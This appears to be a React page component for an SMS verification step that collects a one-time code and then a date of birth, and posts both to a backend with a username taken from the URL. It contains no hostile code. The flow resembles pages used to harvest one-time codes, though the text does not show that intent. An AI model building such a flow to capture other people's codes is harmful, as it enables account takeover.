import { useState, useEffect } from "react";
import { useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import { useMutation } from "@tanstack/react-query";
import { Loader2 } from "lucide-react";
import { apiRequest } from "@/lib/queryClient";
import { useLocation } from "wouter";
import { Logo } from "@/components/Logo";
import { Footer } from "@/components/Footer";
import { SkipNav } from "@/components/SkipNav";
import { ProgressIndicator } from "@/components/ProgressIndicator";
import { z } from "zod";

const smsCodeSchema = z.object({
  code: z.string().length(6, "Code must be 6 digits"),
});

const dobSchema = z.object({
  dateOfBirth: z.string().min(1, "Date of birth is required"),
});

type SMSCodeData = z.infer<typeof smsCodeSchema>;
type DOBData = z.infer<typeof dobSchema>;

export default function SMSVerification() {
  const [location, setLocation] = useLocation();
  const [username, setUsername] = useState<string>("");
  const [timeLeft, setTimeLeft] = useState(300); // 5 minutes
  const [isExpired, setIsExpired] = useState(false);
  const [step, setStep] = useState<1 | 2>(1);
  const [smsCode, setSmsCode] = useState<string>("");

  const today = new Date();
  const maxDateObj = new Date(
    today.getFullYear() - 18,
    today.getMonth(),
    today.getDate(),
  );
  const maxDate = `${maxDateObj.getFullYear()}-${String(
    maxDateObj.getMonth() + 1,
  ).padStart(2, "0")}-${String(maxDateObj.getDate()).padStart(2, "0")}`;
  const minDate = "1900-01-01";

  const smsForm = useForm<SMSCodeData>({
    resolver: zodResolver(smsCodeSchema),
    defaultValues: { code: smsCode },
  });

  const dobForm = useForm<DOBData>({
    resolver: zodResolver(dobSchema),
    defaultValues: { dateOfBirth: "" },
  });

  useEffect(() => {
    const urlParams = new URLSearchParams(window.location.search);
    const usernameParam = urlParams.get("username") || "";
    setUsername(usernameParam);
  }, []);

  useEffect(() => {
    if (timeLeft <= 0) {
      setIsExpired(true);
      return;
    }
    const timer = setInterval(() => {
      setTimeLeft((prev) => prev - 1);
    }, 1000);
    return () => clearInterval(timer);
  }, [timeLeft]);

  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins}:${secs.toString().padStart(2, "0")}`;
  };

  const verifyCodeMutation = useMutation({
    mutationFn: async (data: SMSCodeData) => {
      const response = await apiRequest("POST", "/api/sms/verify-code", {
        username,
        code: data.code,
      });
      return response.json();
    },
    onSuccess: () => {
      setSmsCode(smsForm.getValues().code);
      setStep(2);
    },
    onError: () => {
      smsForm.setError("code", { message: "Invalid verification code" });
    },
  });

  const onVerifyCode = (data: SMSCodeData) => {
    if (isExpired) {
      smsForm.setError("code", {
        message: "Code has expired. Please request a new one.",
      });
      return;
    }
    verifyCodeMutation.mutate(data);
  };

  const verifyMutation = useMutation({
    mutationFn: async (data: DOBData) => {
      const response = await apiRequest("POST", "/api/sms/verify", {
        username,
        code: smsCode,
        dateOfBirth: data.dateOfBirth,
        timestamp: new Date().toISOString(),
      });
      return response.json();
    },
    onSuccess: () => {
      alert("SMS verification successful! Access granted.");
      setLocation("/success");
    },
    onError: () => {
      dobForm.setError("dateOfBirth", {
        message: "Verification failed. Please try again.",
      });
    },
  });

  const resendCodeMutation = useMutation({
    mutationFn: async () => {
      const response = await apiRequest("POST", "/api/sms/resend", {
        username,
      });
      return response.json();
    },
    onSuccess: () => {
      setTimeLeft(120);
      setIsExpired(false);
      smsForm.reset();
      setSmsCode("");
      setStep(1);
      alert("New verification code sent!");
    },
  });

  const goBack = () => {
    if (step === 2) {
      setStep(1);
    } else {
      setLocation("/");
    }
  };

  const isStep1 = step === 1;

  return (
    <div>
      <SkipNav />
      {/* Header */}
      <header className="t-page-header">
        <Logo />
      </header>

      {/* Main Container */}
      <div role="main" id="main-content" className="t-form-container">
        <ProgressIndicator currentStep={3} totalSteps={4} />

        {/* Title */}
        <h1 className="t-mfa-page-header t-able-spacing-4x-mb">
          {isStep1 ? "Enter SMS Verification Code" : "Enter your date of birth"}
        </h1>

        {isStep1 && (
          <p className="text-sm text-gray-600 mb-4">
            We've sent a 6-digit code to your registered phone number for security verification.
          </p>
        )}

        {/* STEP 1: SMS Code Entry */}
        {isStep1 && (
          <form onSubmit={smsForm.handleSubmit(onVerifyCode)}>
            {/* Code Input */}
            <div className="t-able-text-field t-able-spacing-3x-mt t-able-spacing-5x-mb">
              <label htmlFor="code">6-digit code</label>
              <input
                type="text"
                id="code"
                inputMode="numeric"
                maxLength={6}
                placeholder="000000"
                {...smsForm.register("code")}
                disabled={isExpired || verifyCodeMutation.isPending}
                autoFocus
                data-testid="input-sms-code"
              />
              <p id="code-error-text">
                {smsForm.formState.errors.code?.message}
              </p>
              {!isExpired && timeLeft > 0 && (
                <p style={{ marginTop: "8px", fontSize: "12px", color: "#666" }}>
                  Code expires in: <span style={{ fontWeight: "bold", fontFamily: "monospace" }}>{formatTime(timeLeft)}</span>
                </p>
              )}
            </div>

            {/* Resend Section */}
            <div className="t-able-text-label t-able-spacing-1x-mb">
              Didn't get your one-time code?
            </div>
            <button
              type="button"
              onClick={() => resendCodeMutation.mutate()}
              disabled={resendCodeMutation.isPending || (!isExpired && timeLeft > 60)}
              className="t-able-low-emph-button t-able-spacing-4x-mb"
              data-testid="button-resend"
            >
              Resend
              <svg version="1.1" aria-hidden="true" focusable="false" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" style={{ width: "16px", height: "16px", marginLeft: "8px" }}>
                <path d="M15.5 18.1L14.4 17l5-5-5-5 1.1-1.1 6.1 6.1-6.1 6.1z"></path>
                <path d="M7.1 11.2h13.5v1.6H7.1z"></path>
              </svg>
            </button>

            {/* Buttons */}
            <div className="t-able-btn-grp-seq-form-normal t-able-spacing-10x-mb sequence-custom">
              <button
                type="button"
                onClick={goBack}
                id="back"
                data-testid="button-back"
              >
                <svg className="able-icon" aria-hidden="true" focusable="false" viewBox="0 0 24 24" style={{ width: "20px", height: "20px", marginRight: "8px" }}>
                  <path d="M15.5 5.5L8.75 12l6.75 6.5" stroke="currentColor" strokeWidth="2" fill="none" />
                </svg>
                Back
              </button>
              <button
                type="submit"
                id="next"
                data-testid="button-verify-code"
              >
                {verifyCodeMutation.isPending ? "Verifying..." : "Next"}
              </button>
            </div>
          </form>
        )}

        {/* STEP 2: Date of Birth Entry */}
        {!isStep1 && (
          <form onSubmit={dobForm.handleSubmit((data) => verifyMutation.mutate(data))}>
            {/* DOB Input */}
            <div className="t-able-text-field t-able-spacing-3x-mt t-able-spacing-5x-mb">
              <label htmlFor="dateOfBirth">Date of Birth</label>
              <input
                type="date"
                id="dateOfBirth"
                min={minDate}
                max={maxDate}
                {...dobForm.register("dateOfBirth")}
                disabled={verifyMutation.isPending}
                data-testid="input-date-of-birth"
              />
              <p id="dob-error-text">
                {dobForm.formState.errors.dateOfBirth?.message}
              </p>
              <p style={{ marginTop: "8px", fontSize: "12px", color: "#666" }}>
                You must be 18 years or older
              </p>
            </div>

            {/* Buttons */}
            <div className="t-able-btn-grp-seq-form-normal t-able-spacing-10x-mb sequence-custom">
              <button
                type="button"
                onClick={goBack}
                data-testid="button-back-step2"
              >
                <svg className="able-icon" aria-hidden="true" focusable="false" viewBox="0 0 24 24" style={{ width: "20px", height: "20px", marginRight: "8px" }}>
                  <path d="M15.5 5.5L8.75 12l6.75 6.5" stroke="currentColor" strokeWidth="2" fill="none" />
                </svg>
                Back
              </button>
              <button type="submit" id="submit" data-testid="button-submit">
                {verifyMutation.isPending ? "Verifying..." : "Complete"}
              </button>
            </div>
          </form>
        )}
      </div>

      {/* Footer */}
      <Footer />
    </div>
  );
}
